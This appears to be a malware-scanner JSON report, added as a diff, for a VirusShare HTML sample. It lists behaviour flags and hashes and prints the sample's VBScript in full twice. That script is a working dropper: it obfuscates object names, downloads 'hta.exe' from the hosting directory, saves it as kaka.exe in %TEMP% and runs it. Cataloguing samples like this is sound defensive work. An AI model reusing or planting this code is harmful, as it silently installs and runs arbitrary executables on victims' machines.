@@ -1,0 +1,79 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Microsoft.XmlHttp": "May download files from the Internet",
+            "Write": "May write to a file",
+            "chr": "May attempt to obfuscate specific str",
+            "open": "May open a file",
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "<script language=VBScript>\non error resume next\n\nfso=\"Script\"+\"ing\"+\".\"+\"Fil\"+\"eSy\"+\"stem\"+\"Obj\"+\"ect\"\nwso=\"WS\"+\"cr\"+\"ipt.\"+\"S\"+\"hell\"\n\nSet ShellObject=CreateObject(wso)\nSet FileObject=CreateObject(fso)\n\nif(vartype(FileObject)>0 and vartype(ShellObject)>0) then\n\n\texename=ShellObject.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\kaka.exe\"\n\n\tSet File=FileObject.CreateTextFile(exename,True)\n\n\tSet Http = CreateObject(\"Microsoft.XmlHttp\")\n\n\turl=location.href\n\tj=len(url)\n\tneedstop=0\n\tdo while j>0 and needstop=0\n\t\tb=mid(url,j,1)\n\t\tif(b=\"\\\" or b=\"/\") then\n\t\t\tneedstop=1\n\t\tend if\n\t\tj=j-1\n\tloop\n\turl=mid(url,1,j+1) & \"hta.exe\"\n\n\tHttp.open \"GET\", url, FALSE\n\tHttp.send\n\t\n\tif Err.number = 0 and Http.status = 200 then\n\t\n\t\tRaw = Http.responseBody\n\t\n\t\ti = 1\n\t\ttxt = \"\"\n\t    \tDo While i <= Len(Raw)\n\t    \t\tword = ascw(mid(raw,i,1))\n\t    \t\ttxt = txt & chr(word and 255) & chr( ( word and 65280 ) / 256 )\n\t        \ti = i + 1\n\t    \tLoop\n\t\n\t\tFile.Write(txt)\n\t\tFile.Close\n\t\n\t\tShellObject.run(exename)\n\t\n\tend if\n\nend if\n\nrem self.Close\n</script>"
+    },
+    "filename": "VirusShare_40b082f1710b389a903750458cb74a52",
+    "filesize": 1080,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "40b082f1710b389a903750458cb74a52",
+        "sha1": "9e0cf6772484652d5c09decddd600b585143cf94",
+        "sha256": "e13fa231708d1c1beaaf71f24461930175a4a3120431ecb08d1bd3a2ed8571d6"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=VBScript>",
+            "on error resume next",
+            "fso=\"Script\"+\"ing\"+\".\"+\"Fil\"+\"eSy\"+\"stem\"+\"Obj\"+\"ect\"",
+            "wso=\"WS\"+\"cr\"+\"ipt.\"+\"S\"+\"hell\"",
+            "Set ShellObject=CreateObject(wso)",
+            "Set FileObject=CreateObject(fso)",
+            "if(vartype(FileObject)>0 and vartype(ShellObject)>0) then",
+            "\texename=ShellObject.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\kaka.exe\"",
+            "\tSet File=FileObject.CreateTextFile(exename,True)",
+            "\tSet Http = CreateObject(\"Microsoft.XmlHttp\")",
+            "\turl=location.href",
+            "\tj=len(url)",
+            "\tneedstop=0",
+            "\tdo while j>0 and needstop=0",
+            "\t\tb=mid(url,j,1)",
+            "\t\tif(b=\"\\\" or b=\"/\") then",
+            "\t\t\tneedstop=1",
+            "\t\tend if",
+            "\t\tj=j-1",
+            "\tloop",
+            "\turl=mid(url,1,j+1) & \"hta.exe\"",
+            "\tHttp.open \"GET\", url, FALSE",
+            "\tHttp.send",
+            "\tif Err.number = 0 and Http.status = 200 then",
+            "\t\tRaw = Http.responseBody",
+            "\t\ti = 1",
+            "\t\ttxt = \"\"",
+            "\t    \tDo While i <= Len(Raw)",
+            "\t    \t\tword = ascw(mid(raw,i,1))",
+            "\t    \t\ttxt = txt & chr(word and 255) & chr( ( word and 65280 ) / 256 )",
+            "\t        \ti = i + 1",
+            "\t    \tLoop",
+            "\t\tFile.Write(txt)",
+            "\t\tFile.Close",
+            "\t\tShellObject.run(exename)",
+            "\tend if",
+            "end if",
+            "rem self.Close",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.267683",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
